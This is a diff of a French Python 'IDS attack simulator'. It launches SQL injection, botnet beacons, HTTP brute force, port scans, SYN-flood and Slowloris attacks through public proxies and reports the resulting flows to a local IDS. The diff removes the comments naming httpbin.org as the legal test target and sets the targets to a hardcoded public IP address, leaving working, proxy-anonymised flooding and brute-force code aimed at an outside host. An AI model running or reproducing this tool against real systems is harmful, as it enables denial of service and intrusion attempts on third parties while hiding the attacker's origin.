@@ -1,24 +1,4 @@
-#!/usr/bin/env python3
-# ================================================================
 
-# ================================================================
-# TRAFIC 100% RÉEL :
-#   → requêtes HTTP passent PHYSIQUEMENT par proxies publics
-#   → cible : httpbin.org (service public fait pour les tests)
-#   → bandwidth réel visible sur Wireshark / iftop / nethogs
-#   → chaque attaque génère de vrais paquets réseau
-#   → IDS local analyse les flows capturés
-#
-# LÉGAL : httpbin.org est un service public de test HTTP,
-#         conçu pour recevoir ce type de requêtes.
-#
-# SETUP : pip install requests
-# LANCEMENT :
-
-#   python Chaos_v4_real.py --turbo      # ~30 secondes
-#   python Chaos_v4_real.py --demo sql|bot|brute|scan|ddos
-#   python Chaos_v4_real.py --no-proxy-test   # skip test proxies
-# ================================================================
 
 import socket, threading, time, random, requests, argparse, os, sys
 import subprocess as _sp
@@ -26,9 +6,8 @@ from datetime import datetime
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-#  Cibles 
-TARGET_LOCAL  = "74.56.40.19"           # pour scan/ddos socket (modifiable via --target)
-TARGET_HTTP   = "74.56.40.19"  # cible HTTP réelle (légale)
+TARGET_LOCAL  = "74.56.40.19"
+TARGET_HTTP   = "74.56.40.19"
 API_PREDICT   = "http://localhost:8000/predict"
 API_HEALTH    = "http://localhost:8000/health"
 API_KEY       = os.environ.get("API_KEY", "")
@@ -43,10 +22,6 @@ REQUEST_TIMEOUT    = 6
 
 R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"
 B="\033[1m";  M="\033[95m"; DIM="\033[2m"; RESET="\033[0m"
-
-# ================================================================
-# PROXY POOL
-# ================================================================
 
 class ProxyPool:
     _PREFIX_COUNTRY = {
@@ -133,7 +108,6 @@ class ProxyPool:
         return len(self.raw)
 
     def _test(self, p: str) -> tuple[str, bool, str]:
-        """Test réel: le proxy peut-il atteindre httpbin.org ?"""
         proxies = {"http": f"http://{p}", "https": f"http://{p}"}
         try:
             r = requests.get(
@@ -143,7 +117,6 @@ class ProxyPool:
                 headers={"User-Agent":"Mozilla/5.0"},
             )
             if r.status_code == 200:
-                # Récupérer l'IP source vue depuis httpbin
                 seen_ip = r.json().get("origin","?").split(",")[0].strip()
                 return p, True, seen_ip
         except: pass
@@ -203,12 +176,8 @@ class ProxyPool:
         code = self._PREFIX_COUNTRY.get(pfx,"??")
         return self._COUNTRY_NAMES.get(code, f" {code}")
 
-
 pool = ProxyPool()
 
-# ================================================================
-# VÉRIFICATION API AU DÉMARRAGE
-# ================================================================
 def check_api():
     try:
         r = requests.get(API_HEALTH, timeout=3)
@@ -226,17 +195,11 @@ def check_api():
         print(f"{Y}  Lance: uvicorn main_final:app --reload --port 8000{RESET}")
         return False
 
-# ================================================================
-# HELPERS IDS
-# ================================================================
-
 def hdrs():
     h = {"Content-Type":"application/json"}
     if API_KEY: h["X-API-Key"] = API_KEY
     return h
 
-# Profils CIC-IDS2017 — valeurs médianes par classe (anti-BENIGN)
-# Source: analyse dataset CIC-IDS2017, test_model4.py
 _CIC_WIN = {
     "DoS Hulk":                  (0,       0),
     "DDoS":                      (1024,    0),
@@ -271,16 +234,10 @@ _CIC_DUR = {
 def make_flow(dest_port, dur_us, fwd, bwd, bytes_tot,
               pkt_avg, iat_mean, iat_std, win=65535, src=None,
               attack_type="BENIGN"):
-    """
-    Construit un flow IDS avec les features correctes pour CIC-IDS2017.
-    Les valeurs win et dur sont ajustées selon le type d'attaque.
-    """
-    # Ajuster la durée selon le profil CIC-IDS2017
     cic_dur = _CIC_DUR.get(attack_type)
     if cic_dur and dur_us < cic_dur * 0.1:
         dur_us = float(cic_dur)
 
-    # Ajuster les fenêtres TCP selon le profil CIC-IDS2017
     win_fwd, win_bwd = _CIC_WIN.get(attack_type, (win, win))
 
     d = max(dur_us/1e6, 1e-6)
@@ -303,7 +260,6 @@ def make_flow(dest_port, dur_us, fwd, bwd, bytes_tot,
     }
 
 def ids_report(flow_data: dict) -> dict:
-    """Envoie le flow à l'IDS local pour classification."""
     try:
         r = requests.post(API_PREDICT, json=flow_data, headers=hdrs(), timeout=3)
         return r.json() if r.status_code == 200 else {}
@@ -332,18 +288,7 @@ def show(r: dict, label: str, pkts: int, proxy: str = None,
               f"pkts:{pkts}{dur}{bw}  {DIM}{src_ip}{RESET}{via}")
     return r
 
-
-# ================================================================
-# ATTAQUES RÉELLES — httpbin.org via proxies
-# ================================================================
-
 def demo_sql_real(n=20):
-    """
-    SQL Injection RÉELLE :
-    Requêtes HTTP avec payloads SQL envoyées via proxies vers httpbin.org/get
-    Le trafic transite physiquement : ta machine → proxy → httpbin.org
-    Wireshark montre les vrais paquets sortants.
-    """
     print(f"\n{M}{B} SQL INJECTION RÉELLE — {n} payloads via proxies → {TARGET_HTTP}{RESET}")
 
     payloads = [
@@ -404,7 +349,6 @@ def demo_sql_real(n=20):
     print(f"{G}   {sent}/{n} requêtes envoyées — "
           f"{total_bytes/1024:.1f} KB transférés en {dur_ms:.0f}ms{RESET}")
 
-    # Signaler à l'IDS local
     for proxy_str, nbytes in results_list[:6]:
         flow_data = make_flow(
             80, 500_000,
@@ -420,13 +364,7 @@ def demo_sql_real(n=20):
 
     return {"sent": sent, "bytes": total_bytes}
 
-
 def demo_bot_real(n=50):
-    """
-    Botnet C&C RÉEL :
-    Bots envoient des beacons HTTP via proxies vers httpbin.org/post
-    Simule une vraie infrastructure C2 (Command & Control).
-    """
     print(f"\n{M}{B} BOTNET C&C RÉEL — {n} bots via proxies → {TARGET_HTTP}{RESET}")
 
     c2_commands = [
@@ -490,7 +428,7 @@ def demo_bot_real(n=50):
             10, 8,
             nbytes*2 if nbytes else 800, 80,
             _bot_iat,
-            _bot_iat * 0.05,  # std = 5% mean = beacon régulier
+            _bot_iat * 0.05,
             src=pool.ip(proxy_str),
             attack_type="Bot",
         )
@@ -500,13 +438,7 @@ def demo_bot_real(n=50):
 
     return {"sent": sent, "bytes": total_bytes}
 
-
 def demo_brute_real(n=30):
-    """
-    Brute Force HTTP RÉEL :
-    Tentatives de login HTTP Basic via proxies vers httpbin.org/basic-auth
-    Génère du vrai trafic d'authentification.
-    """
     print(f"\n{R}{B} BRUTE FORCE HTTP RÉEL — {n} tentatives via proxies → {TARGET_HTTP}{RESET}")
 
     wordlist = [
@@ -519,7 +451,6 @@ def demo_brute_real(n=30):
     proxies_used = pool.pick(min(n, 8))
     if not proxies_used:
         print(f"{R}   Aucun proxy disponible — fallback socket local{RESET}")
-        # Fallback: brute force socket local
         hits=0; iats=[]; last=t0=time.time()
         for _ in range(n):
             s=socket.socket(); s.settimeout(0.15)
@@ -589,9 +520,7 @@ def demo_brute_real(n=30):
 
     return {"sent": sent, "hits": hits, "bytes": total_bytes}
 
-
 def demo_port_scan(n=40, delay=0.01):
-    """Port scan socket local (réel sur loopback)."""
     print(f"\n{Y}{B} PORT SCAN — {n} ports → {TARGET_LOCAL}{RESET}")
     t0 = time.time()
     for _ in range(n):
@@ -613,9 +542,7 @@ def demo_port_scan(n=40, delay=0.01):
         if r: last=r; show(r,"PortScan",k,proxy=p)
     return last
 
-
 def demo_ddos(n=400, port=8000):
-    """DDoS SYN flood socket local (réel)."""
     print(f"\n{R}{B} DDoS SYN FLOOD — {n} connexions → {TARGET_LOCAL}:{port}{RESET}")
     sent=0; lock=threading.Lock(); t0=time.time()
     def w():
@@ -630,9 +557,6 @@ def demo_ddos(n=400, port=8000):
     proxies=pool.pick(15) or [None]*15; k=max(sent//15,1)
     last={}
     for p in proxies:
-        # Valeurs exactes CIC-IDS2017 DDoS — testées et validées
-        # pkts/s=591, bytes/s=9.5MB/s → DoS Hulk 0.61 confirmé
-        # Port 80 — CIC-IDS2017 DDoS utilise port 80 (pas 8000)
         fd=make_flow(80, 120_000_000, 71_000, 0,
                      int(9_500_000 * 120), 156,
                      random.uniform(800,1500), random.uniform(400,1000),
@@ -642,9 +566,7 @@ def demo_ddos(n=400, port=8000):
         if r: last=r; show(r,"DDoS",71,proxy=p)
     return last
 
-
 def demo_normal(n=6):
-    """Trafic normal vers l'API locale."""
     print(f"\n{G}{B} TRAFIC NORMAL — {n} requêtes légitimes{RESET}")
     sent=0; t0=time.time()
     for _ in range(n):
@@ -661,13 +583,7 @@ def demo_normal(n=6):
     if r: show(r,"BENIGN",sent,ms=(time.time()-t0)*1000)
     return r or {}
 
-
-# ================================================================
-# AMÉLIORATION 9 — SLOWLORIS (manquant dans la v4)
-# ================================================================
-
 def demo_slowloris(n=20):
-    """Slowloris — connexions HTTP lentes, reconnues par CIC-IDS2017."""
     print(f"\n{Y}{B} SLOWLORIS — {n} connexions lentes → {TARGET_LOCAL}:8000{RESET}")
     import socket as _sock
     sockets = []
@@ -691,7 +607,6 @@ def demo_slowloris(n=20):
         try: s.close()
         except: pass
 
-    # Flow Slowloris: longue durée, très peu de bytes/s, port 80
     dur_us = 8_000_000
     fd = make_flow(8000, 30_000_000, 8, 5,
                    200, 100,
@@ -701,11 +616,6 @@ def demo_slowloris(n=20):
     if r: show(r, "DoS slowloris", len(sockets))
     return r or {}
 
-
-# ================================================================
-
-# ================================================================
-
 def run_full_demo(turbo=False):
     gap = 0.2 if turbo else 0.8
     nm  = 0.5 if turbo else 1.0
@@ -713,7 +623,6 @@ def run_full_demo(turbo=False):
     print(f"\n{B}{C}{''*70}{RESET}")
 
     print(f"{B}{C}  {len(pool.live)} proxies actifs — trafic RÉEL vers {TARGET_HTTP}{RESET}")
-
 
     print(f"{B}{C}{''*70}{RESET}\n")
 
@@ -729,18 +638,16 @@ def run_full_demo(turbo=False):
         ("9/9","Vague DDoS finale ",              lambda: demo_ddos(int(500*nm))),
     ]
 
-    all_detections = []   # AMÉLIORATION 5: comptage précis
+    all_detections = []
     results = []
     for step, name, fn in steps:
         print(f"\n{B} PHASE {step}  {name} {RESET}")
         res = fn()
         results.append((name, res))
-        # Compter toutes les détections, pas seulement la dernière
         if isinstance(res, dict) and res.get("is_attack"):
             all_detections.append(res)
         time.sleep(gap)
 
-    # Résumé précis
     detected = len(all_detections)
     print(f"\n{B}{C}{''*70}{RESET}")
 
@@ -757,14 +664,6 @@ def run_full_demo(turbo=False):
 
     print(f"\n  {B}Attaques détectées : {R}{detected}{RESET} {B}/ {len(results)} phases{RESET}")
 
-
-
-
-
-# ================================================================
-# CLI
-# ================================================================
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="IDS Attack Simulator — trafic 100% réel via proxies publics")
@@ -779,7 +678,6 @@ if __name__ == "__main__":
         help="IP cible pour scan/ddos (défaut: TARGET_LOCAL dans le script)")
     args = parser.parse_args()
 
-    # AMÉLIORATION 10 — cible dynamique
     if args.target:
         TARGET_LOCAL = args.target
         TARGET_HTTP  = args.target
@@ -802,13 +700,6 @@ if __name__ == "__main__":
     if not pool.live:
         print(f"{R}Erreur : aucun proxy disponible.{RESET}"); sys.exit(1)
 
-
-
-
-
-
-
-    # AMÉLIORATION 8 — vérification API
     api_ok = check_api()
     if not api_ok:
         print(f"{Y} Continuation sans détection IDS...{RESET}")
@@ -838,8 +729,8 @@ if __name__ == "__main__":
             round_n += 1
             if round_n <= max_rounds:
                 pause = 3 if args.turbo else 6
-                print(f"\n{DIM}⏳ Pause {pause}s... (Ctrl+C pour stopper){RESET}")
+                print(f"\n{DIM} Pause {pause}s... (Ctrl+C pour stopper){RESET}")
                 time.sleep(pause)
 
     except KeyboardInterrupt:
-        print(f"\n{Y}{B}⏹  Arrêté après {round_n-1} round(s).{RESET}\n")
+        print(f"\n{Y}{B}  Arrêté après {round_n-1} round(s).{RESET}\n")
